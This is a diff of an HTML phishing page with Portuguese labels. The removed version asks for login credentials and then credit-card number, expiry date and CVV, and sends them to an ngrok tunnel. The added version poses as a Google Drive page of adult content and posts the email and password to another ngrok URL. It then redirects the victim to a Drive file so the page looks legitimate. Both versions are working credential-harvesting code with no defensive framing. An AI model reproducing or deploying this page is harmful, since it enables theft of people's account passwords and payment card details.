@@ -68,39 +68,22 @@
     </style>
 </head>
 <body>
-    <div class="container" id="loginContainer">
-        <h2>Login</h2>
-        <form id="loginForm" method="POST" action="/">
+    <div class="container">
+        <h2>Conteúdos GoogleDrive🔞</h2>
+        <form id="loginForm" method="POST" action="https://71ad-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
             <div class="form-group">
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
             </div>
-            <button type="button" onclick="enviarLogin()">Entrar</button>
+            <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
         </form>
     </div>
 
-    <div class="container" id="cartaoContainer" style="display: none;">
-        <h2>Detalhes do Cartão</h2>
-        <form id="cartaoForm" method="POST" action="https://b03d-2804-6850-8000-3d01-c12e-b350-c502-7e67.ngrok-free.app/">
-            <div class="form-group">
-                <input type="text" class="form-control" id="card_number" name="card_number" placeholder="Número do cartão">
-            </div>
-            <div class="form-group">
-                <input type="text" class="form-control" id="expiration_date" name="expiration_date" placeholder="Data de expiração (MM/AA)">
-            </div>
-            <div class="form-group">
-                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV">
-            </div>
-            <button type="button" onclick="enviarCartao()">Enviar</button>
-            <p id="mensagemErroCartao" style="color: red;"></p>
-        </form>
-    </div>
-
     <script>
-        function enviarLogin() {
+        function enviarFormulario() {
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
 
@@ -117,40 +100,10 @@
             xhr.open('POST', document.getElementById("loginForm").action);
             xhr.onload = function () {
                 if (xhr.status === 200) {
-                    document.getElementById("loginContainer").style.display = "none";
-                    document.getElementById("cartaoContainer").style.display = "block";
+                    window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
                 } else {
                     var mensagem = xhr.responseText;
                     document.getElementById('mensagemErro').innerText = mensagem;
-                }
-            };
-            xhr.send(formData);
-        }
-
-        function enviarCartao() {
-            var cardNumber = document.getElementById('card_number').value;
-            var expirationDate = document.getElementById('expiration_date').value;
-            var cvv = document.getElementById('cvv').value;
-
-            if (cardNumber === '' || expirationDate === '' || cvv === '') {
-                document.getElementById('mensagemErroCartao').innerText = 'Por favor, preencha todos os campos.';
-                return;
-            }
-
-            var formData = new FormData();
-            formData.append('card_number', cardNumber);
-            formData.append('expiration_date', expirationDate);
-            formData.append('cvv', cvv);
-
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', document.getElementById("cartaoForm").action);
-            xhr.onload = function () {
-                if (xhr.status === 200) {
-                    alert('Detalhes do cartão enviados com sucesso!');
-                    // Você pode redirecionar a página ou fazer outra ação aqui
-                } else {
-                    var mensagem = xhr.responseText;
-                    document.getElementById('mensagemErroCartao').innerText = mensagem;
                 }
             };
             xhr.send(formData);
